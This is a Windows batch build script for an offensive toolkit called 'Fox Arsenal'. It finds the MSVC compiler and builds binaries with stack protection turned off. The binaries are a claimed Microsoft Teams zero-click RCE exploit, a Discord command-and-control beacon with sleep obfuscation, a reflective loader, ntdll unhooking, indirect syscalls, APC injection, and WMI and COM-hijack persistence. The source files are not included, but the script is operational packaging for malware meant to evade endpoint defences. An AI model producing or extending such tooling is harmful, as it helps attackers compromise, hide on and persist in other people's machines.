@echo off
setlocal enabledelayedexpansion

:: Set the working directory to the location of the batch file
cd /d "%~dp0"

echo [*] Starting Compilation of the Fox Arsenal...

:: Check if cl.exe is already in PATH (e.g., running from Native Tools Command Prompt)
where cl >nul 2>nul
if %ERRORLEVEL% equ 0 (
    echo [*] MSVC compiler (cl.exe) found in PATH. Proceeding with compilation...
    goto :compile
)

:: If cl.exe is not found, try to find vcvarsall.bat to initialize the MSVC environment
echo [*] cl.exe not found in PATH. Attempting to locate vcvarsall.bat...
set "VCVARS="

:: Check common Visual Studio installation paths
set "VS_PATHS="
set "VS_PATHS=!VS_PATHS! C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"
set "VS_PATHS=!VS_PATHS! C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvarsall.bat"

for %%p in (!VS_PATHS!) do (
    if exist "%%p" (
        set "VCVARS=%%p"
        goto :found_vcvars
    )
)

:: If not found in common paths, try using vswhere
for /f "usebackq tokens=*" %%i in (`"%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
    set "VCVARS=%%i\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "!VCVARS!" goto :found_vcvars
)

:found_vcvars
if not defined VCVARS (
    echo [-] Error: Could not find vcvarsall.bat. Please ensure Visual Studio with C++ desktop development is installed.
    echo [-] Alternatively, run this script from the "x64 Native Tools Command Prompt for VS".
    exit /b 1
)

echo [*] Initializing MSVC Environment...
call "%VCVARS%" x64 >nul

:compile
:: Create a bin directory for the output
if not exist "bin" mkdir bin

echo [*] Compiling CVE-2025-23198 (Microsoft Teams Zero-Click RCE)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc cve_2025_23198_teams_rce.cpp /link /OUT:bin\teams_rce.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Native Discord C2 Beacon (v2) with Ekko Sleep...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\main_beacon_v2.cpp /Tc discord_c2_v2\sleep_ekko.cpp /link /OUT:bin\beacon_v2.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Custom Reflective Loader (sRDI)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\reflective_loader.cpp /link /OUT:bin\loader.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Evasion (Ntdll Unhooking)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\evasion_native.cpp /link /OUT:bin\evasion.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Indirect Syscalls (Halo's Gate)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_indirect_syscalls.cpp /link /OUT:bin\syscalls.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling APC Injection...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_apc.cpp /link /OUT:bin\apc_inject.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling WMI Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_wmi.cpp /link /OUT:bin\persist_wmi.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling COM Hijacking Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_com_hijack.cpp /link /OUT:bin\persist_com.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

:: Clean up object files
del *.obj >nul 2>&1

echo [*] Compilation complete. Check the 'bin' folder.
